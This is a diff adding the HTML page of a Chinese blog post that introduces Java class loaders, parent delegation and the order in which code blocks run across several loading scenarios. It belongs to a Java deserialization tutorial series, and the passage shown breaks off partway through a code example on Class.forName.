@@ -1,0 +1,1256 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="且将新火试新茶，诗酒趁年华">
+    <meta name="author" content="Drunkbaby">
+    
+    <title>
+        
+            Java反序列化基础篇-05-类的动态加载 |
+        
+        Drunkbaby&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"drun1baby.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066cc","logo":"https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png","favicon":"https://github.com/Drun1baby/CVE_Pentest/blob/main/%E5%8F%8B%E9%93%BEimages/favicon.png","avatar":"/images/avatar.svg","font_size":"16px","font_family":null,"hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"header_transparent":true,"background_img":"/images/bg.svg","description":"且将新火试新茶，诗酒趁年华","font_color":null,"hitokoto":false},"scroll":{"progress_bar":true,"percent":false}},"local_search":{"enable":true,"preload":true},"code_copy":{},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":true},"lazyload":{"enable":false},"comment":{"enable":true,"use":"valine","valine":{"enable":true,"appid":"mCIu9X4iLP3I0GikUoetB9bV-9Nh9j0Va","appkey":"ermlV1eoB1YODT088EdXjo6C","placeholder":"just go go","background":"/images/comment_bg.png","count":true},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.8"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":true,"wordcount":true,"min2read":true},"img_align":"left","copyright_info":true},"version":"3.6.1"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="https://raw.githubusercontent.com/Drun1baby/CVE_Pentest/main/%E5%8F%8B%E9%93%BEimages/logo.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Drunkbaby&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">Java反序列化基础篇-05-类的动态加载</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">Drunkbaby</span>
+                            
+                                <span class="author-label">Lv6</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2022-06-03 21:54:03</span>
+        <span class="mobile">2022-06-03 21:54</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2022-09-18 17:37:28</span>
+    </span>
+    
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Java/">Java</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Java/">Java</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>5.5k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>23 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                
+
+                <h1 id="Java反序列化基础篇-05-类的动态加载"><a href="#Java反序列化基础篇-05-类的动态加载" class="headerlink" title="Java反序列化基础篇-05-类的动态加载"></a>Java反序列化基础篇-05-类的动态加载</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这篇文章&#x2F;笔记的话，打算从类加载器，双亲委派到代码块的加载顺序这样来讲。最后才是加载字节码。</p>
+<h2 id="0x02-类加载器及双亲委派"><a href="#0x02-类加载器及双亲委派" class="headerlink" title="0x02 类加载器及双亲委派"></a>0x02 类加载器及双亲委派</h2><ul>
+<li>说类加载器有些师傅可能没听过，但是说 Java ClassLoader，相信大家耳熟能详。</li>
+</ul>
+<h3 id="1-类加载器有什么用"><a href="#1-类加载器有什么用" class="headerlink" title="1. 类加载器有什么用"></a>1. 类加载器有什么用</h3><ul>
+<li>加载 Class 文件</li>
+</ul>
+<p>以这段简单代码为例</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Student</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>我们知道，Student 本身其实是一个抽象类，是通过 new 这个操作，将其实例化的，<strong>类加载器</strong>做的便是这个工作。</p>
+<p>ClassLoader 的工作如图所示</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ClassLoaderWork.png" class="">
+
+<p>加载器也分多种加载器，每个加载器负责不同的功能。</p>
+<p>主要分为这四种加载器</p>
+<blockquote>
+<ol>
+<li>虚拟机自带的加载器</li>
+<li>启动类（根）加载器</li>
+<li>扩展类加载器</li>
+<li>应用程序加载器</li>
+</ol>
+</blockquote>
+<h3 id="2-几种加载器"><a href="#2-几种加载器" class="headerlink" title="2. 几种加载器"></a>2. 几种加载器</h3><h4 id="引导类加载器"><a href="#引导类加载器" class="headerlink" title="引导类加载器"></a>引导类加载器</h4><blockquote>
+<p>引导类加载器(BootstrapClassLoader)，底层原生代码是 C++ 语言编写，属于 JVM 一部分。</p>
+</blockquote>
+<p>不继承 <code>java.lang.ClassLoader</code> 类，也没有父加载器，主要负责加载核心 java 库(即 JVM 本身)，存储在 <code>/jre/lib/rt.jar</code> 目录当中。(同时处于安全考虑，<code>BootstrapClassLoader</code> 只加载包名为 <code>java</code>、<code>javax</code>、<code>sun</code> 等开头的类)。</p>
+<h4 id="扩展类加载器（ExtensionsClassLoader）"><a href="#扩展类加载器（ExtensionsClassLoader）" class="headerlink" title="扩展类加载器（ExtensionsClassLoader）"></a>扩展类加载器（ExtensionsClassLoader）</h4><p>扩展类加载器(ExtensionsClassLoader)，由 <code>sun.misc.Launcher$ExtClassLoader</code> 类实现，用来在 <code>/jre/lib/ext</code> 或者 <code>java.ext.dirs</code> 中指明的目录加载 java 的扩展库。Java 虚拟机会提供一个扩展库目录，此加载器在目录里面查找并加载 java 类。</p>
+<h4 id="App类加载器（AppClassLoader）"><a href="#App类加载器（AppClassLoader）" class="headerlink" title="App类加载器（AppClassLoader）"></a>App类加载器（AppClassLoader）</h4><p>App类加载器&#x2F;系统类加载器（AppClassLoader），由 <code>sun.misc.Launcher$AppClassLoader</code> 实现，一般通过通过( <code>java.class.path</code> 或者 <code>Classpath</code> 环境变量)来加载 Java 类，也就是我们常说的 classpath 路径。通常我们是使用这个加载类来加载 Java 应用类，可以使用 <code>ClassLoader.getSystemClassLoader()</code> 来获取它。</p>
+<h3 id="3-双亲委派机制"><a href="#3-双亲委派机制" class="headerlink" title="3. 双亲委派机制"></a>3. 双亲委派机制</h3><ul>
+<li>在 Java 开发当中，双亲委派机制是从安全角度出发的。</li>
+</ul>
+<p>我们这里以代码先来感受一下，双亲委派机制确实牛逼。</p>
+<h4 id="从报错的角度感受双亲委派机制"><a href="#从报错的角度感受双亲委派机制" class="headerlink" title="从报错的角度感受双亲委派机制"></a>从报错的角度感受双亲委派机制</h4><ul>
+<li>尽量别尝试，看看就好了。要不然整个文件夹挺乱的，如果想上手尝试一下的话，我建议是新建一个项目，不要把其他的文件放一起。</li>
+</ul>
+<p>新建一个 <strong>java.lang的文件夹</strong>，在其中新建 <strong>String.java</strong> 的文件。</p>
+<p><strong>String.java</strong></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">java<span class="token punctuation">.</span>lang</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// 双亲委派的错误代码  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">String</span> <span class="token punctuation">&#123;</span>  
+  
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+        <span class="token keyword">return</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ s<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>看着是不是没有问题，没有错误吧？<br>我们自己定义了一个 <code>java.lang</code> 的文件夹，并在文件夹中定义了 String.class，还定义了 String 这个类的 toString 方法。我们跑一下程序。（这里如果把 Stirng 类放到其他文件夹会直接报错，原因也是和下面一样的）</p>
+<ul>
+<li>结果居然报错了！而且非常离谱</li>
+</ul>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ErrorStringFile.png" class="">
+
+<p>我这不是已经定义了 main 方法吗？？为什么还会报错，这里就提到双亲委派机制了，双亲委派机制是从安全角度出发的。</p>
+<p>首先，我们要知道 Java 的类加载器是分很多层的，如图。</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ClassLoaderSequence.png" class="">
+
+<p>我们的类加载器在被调用时，也就是在 new class 的时候，它是以这么一个顺序去找的 BOOT —&gt; EXC —-&gt; APP</p>
+<p>如果 BOOT 当中没有，就去 EXC 里面找，如果 EXC 里面没有，就去 APP 里面找。</p>
+<ul>
+<li>所以我们之前报错的程序当中，定义的 <code>java.lang.String</code> 在 BOOT 当中是有的，所以我们自定义 String 时，会报错，如果要修改的话，是需要去 rt.jar 里面修改的，这里就不展开了。</li>
+</ul>
+<h4 id="从正确的角度感受双亲委派机制"><a href="#从正确的角度感受双亲委派机制" class="headerlink" title="从正确的角度感受双亲委派机制"></a>从正确的角度感受双亲委派机制</h4><p>前文提到我们新建的 <code>java.lang.String</code> 报错了，是因为我们定义的 String 和 BOOT 包下面的 String 冲突了，所以才会报错，我们这里定义一个 BOOT 和 EXC 都没有的对象试一试。</p>
+<p><strong>在其他的</strong> 文件夹下，新建 <strong>Student.java</strong></p>
+<p><strong>Student.java</strong></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// 双亲委派的正确代码  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">&#123;</span>  
+  
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+        <span class="token keyword">return</span> <span class="token string">"Hello"</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token class-name">Student</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+  
+ <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>student<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>并把加载器打印出来</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/SuccessClassFile.png" class="">
+<p>我们定义的 Student 类在 APP 加载器中找到了。</p>
+<h2 id="0x03-各场景下代码块加载顺序"><a href="#0x03-各场景下代码块加载顺序" class="headerlink" title="0x03 各场景下代码块加载顺序"></a>0x03 各场景下代码块加载顺序</h2><ul>
+<li><p>这里的代码块主要指的是这四种</p>
+<ul>
+<li>静态代码块：<code>static&#123;&#125;</code></li>
+<li>构造代码块：<code>&#123;&#125;</code></li>
+<li>无参构造器：<code>ClassName()</code></li>
+<li>有参构造器：<code>ClassName(String name)</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="场景一、实例化对象"><a href="#场景一、实例化对象" class="headerlink" title="场景一、实例化对象"></a>场景一、实例化对象</h3><p>这里有两个文件，分别介绍一下用途：</p>
+<ul>
+<li><code>Person.java</code>：一个普普通通的类，里面有静态代码块、构造代码块、无参构造器、有参构造器、静态成员变量、普通成员变量、静态方法。</li>
+<li><code>Main.java</code>：启动类</li>
+</ul>
+<p><strong>Person.java</strong></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// 存放代码块  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> staticVar<span class="token punctuation">;</span>  
+ <span class="token keyword">public</span> <span class="token keyword">int</span> instanceVar<span class="token punctuation">;</span>  
+  
+ <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>  
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"静态代码块"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+  
+    <span class="token punctuation">&#123;</span>  
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"构造代码块"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+  
+    <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"无参构造器"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+    <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token keyword">int</span> instanceVar<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"有参构造器"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">staticAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"静态方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>Main.java</strong></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// 代码块的启动器  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>运行结果如图</p>
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/InstanceFieldShow.png" class="">
+
+<ul>
+<li><strong>结论：</strong></li>
+</ul>
+<p>通过 <code>new</code> 关键字实例化的对象，先调用<strong>静态代码块</strong>，然后调用<strong>构造代码块</strong>，最后根据实例化方式不同，调用不同的构造器。</p>
+<h3 id="场景二、调用静态方法"><a href="#场景二、调用静态方法" class="headerlink" title="场景二、调用静态方法"></a>场景二、调用静态方法</h3><p>直接调用类的静态方法</p>
+<p>Person.java 不变，修改 Main.java 启动器即可。</p>
+<p><strong>Main.java</strong></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// 代码块的启动器  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+        <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token function">staticAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+ <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/StaticAction.png" class="">
+<ul>
+<li><strong>结论：</strong></li>
+</ul>
+<p>不实例化对象直接调用静态方法，会先调用类中的<strong>静态代码块</strong>，然后调用<strong>静态方法</strong></p>
+<h3 id="场景三、对类中的静态成员变量赋值"><a href="#场景三、对类中的静态成员变量赋值" class="headerlink" title="场景三、对类中的静态成员变量赋值"></a>场景三、对类中的静态成员变量赋值</h3><p><strong>Main.java</strong></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// 代码块的启动器  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+         <span class="token class-name">Person</span><span class="token punctuation">.</span>staticVar <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  
+     <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<img src="/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/ValueStatic.png" class="">
+
+<ul>
+<li><strong>结论：</strong></li>
+</ul>
+<p>在对静态成员变量赋值前，会调用<strong>静态代码块</strong></p>
+<h3 id="场景四、使用-class-获取类"><a href="#场景四、使用-class-获取类" class="headerlink" title="场景四、使用 class 获取类"></a>场景四、使用 class 获取类</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// 代码块的启动器  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+         <span class="token class-name">Class</span> c <span class="token operator">=</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>  
+     <span class="token punctuation">&#125;</span>  
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// 空屁</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ul>
+<li><strong>结论：</strong></li>
+</ul>
+<p>利用 <code>class</code> 关键字获取类，并不会加载类，也就是什么也不会输出。</p>
+<h3 id="场景五、使用-forName-获取类"><a href="#场景五、使用-forName-获取类" class="headerlink" title="场景五、使用 forName 获取类"></a>场景五、使用 forName 获取类</h3><ul>
+<li>这里要抛出异常一下。</li>
+</ul>
+<p>我们写三种 <code>forName</code> 的方法调用。<br>修改 <strong>Main.java</strong></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">src<span class="token punctuation">.</span></span><span class="token class-name">DynamicClassLoader</span><span class="token punctuation">;</span>  
+  
+<span class="token comment">// 代码块的启动器  </span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>  
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">&#123;</span>  
